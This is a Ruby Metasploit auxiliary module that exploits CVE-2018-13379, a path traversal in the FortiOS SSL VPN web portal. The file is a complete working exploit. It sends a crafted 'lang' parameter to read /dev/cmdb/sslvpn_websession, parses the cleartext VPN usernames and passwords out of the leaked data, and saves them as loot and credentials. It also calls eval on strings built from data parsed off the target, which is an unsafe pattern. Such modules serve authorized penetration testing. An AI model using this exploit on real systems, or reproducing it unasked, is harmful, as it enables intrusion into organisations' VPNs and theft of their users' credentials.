##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient
  include Msf::Post::File

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'FortiOS Path Traversal Leak Credentials',
      'Description' => %q{
        FortiOS system file leak through SSL VPN via specially crafted HTTP resource requests.
        A path traversal vulnerability in the FortiOS SSL VPN web portal may allow an unauthenticated
        attacker to download FortiOS system files through specially crafted HTTP resource requests.
        This module reads logins and passwords in clear text from the `/dev/cmdb/sslvpn_websession` file.
        This vulnerability affects (FortiOS 5.4.6 to 5.4.12, FortiOS 5.6.3 to 5.6.7 and FortiOS 6.0.0 to 6.0.4).
      },
      'References' => [
        ['CVE', '2018-13379'],
        ['URL', 'https://www.fortiguard.com/psirt/FG-IR-18-384'],
        ['EDB', '47287'],
        ['EDB', '47288']
      ],
      'Author' => [
        'lynx (Carlos Vieira)',         # initial module author from edb
        'mekhalleh (RAMELLA Sébastien)' # this module author (Zeop Entreprise)
      ],
      'License' => MSF_LICENSE,
      'DefaultOptions' => {
        'RPORT' => 443,
        'SSL' => true
      },
    ))

    register_options([
      OptEnum.new('DUMP_FORMAT', [true,  'Dump format.', 'raw', ['raw', 'ascii']]),
      OptBool.new('STORE_CRED', [false, 'Store credential into the database.', true]),
      OptBool.new('STORE_LOOT', [false, 'Store dump in loot.', true]),
      OptString.new('TARGETURI', [true, 'Base path', '/remote'])
    ])
  end

  def execute_request
    payload = '/../../../..//////////dev/cmdb/sslvpn_websession'

    uri = normalize_uri(target_uri.path, 'fgt_lang')
    begin
      response = send_request_cgi({
        'method' => 'GET',
        'uri' => uri,
        'vars_get' => {
          'lang' => payload
        }
      })

    rescue StandardError => e
      print_error(message("#{e.message}"))
      return nil
    end

    if response && response.code == 200
      if response.body =~ /var fgt_lang/
        print_good(message('Vulnerable!'))

        report_vuln(
          host: @ip_address,
          name: name,
          refs: references,
        )

        return response.body if datastore['STORE_CRED'] == true
      end
    elsif response && response.code == 404
      print_error(message('NOT Vulnerable!'))
    end

    return nil
  end

  def message(msg)
    "#{@proto}://#{datastore['RHOST']}:#{datastore['RPORT']} - #{msg}"
  end

  def parse_config(chunk)
    credential = {
      ip: @ip_address,
      port: datastore['RPORT'],
      service_name: @proto,
      user: read_param(chunk[36..421]),
      password: read_param(chunk[422..550]),
      group: read_param(chunk[551..622]),
      profile: read_param(chunk[623..698])
    }
  end

  def read_param(param)
    output = ''
    param.each_char do |c|
      break if c == "\x00"
      output << c
    end
    return output
  end

  def report_creds(creds)
    creds.each do |cred|
      cred = eval(cred)

      if !cred[:user].blank? && !cred[:password].blank?
        service_data = {
          address: cred[:ip],
          port: cred[:port],
          service_name: cred[:service_name],
          protocol: 'tcp',
          workspace_id: myworkspace_id
        }

        credential_data = {
          origin_type: :service,
          module_fullname: fullname,
          username: cred[:user],
          private_data: cred[:password],
          private_type: :password
        }.merge(service_data)

        login_data = {
          core: create_credential(credential_data),
          status: Metasploit::Model::Login::Status::UNTRIED
        }.merge(service_data)

        create_credential_login(login_data)
      end

    end
  end

  def run_host(ip)
    @proto = (ssl ? 'https' : 'http')
    @ip_address = ip

    print_status(message('Trying to connect.'))
    data = execute_request
    if !data.nil?
      if datastore['STORE_LOOT']
        case datastore['DUMP_FORMAT']
        when /ascii/
          loot_data = data.gsub(/[^[:print:]]/, '.')
        else
          loot_data = data
        end
        loot_path = store_loot('', 'text/plain', @ip_address, loot_data, '', '')
        print_good(message("File saved to #{loot_path}"))
      end

      if data[72..73] == "\x5F\x01"
        io = StringIO.new(data[74..-1])
      elsif data[104..109] == "\x5F\x00\x00\x00\x00\x01"
        io = StringIO.new(data[110..-1])
      end

      begin
        creds = []
        until io.eof?
          chunk = io.read(913)
          if chunk[0] != "\x00"
            creds << "#{parse_config(chunk)}"
          end
        end
      rescue NoMethodError
        print_error(message('No credential(s) found!'))
        return
      end

      print_good(message("#{creds.length} credential(s) found!"))
      report_creds(creds)
    end
  end

end
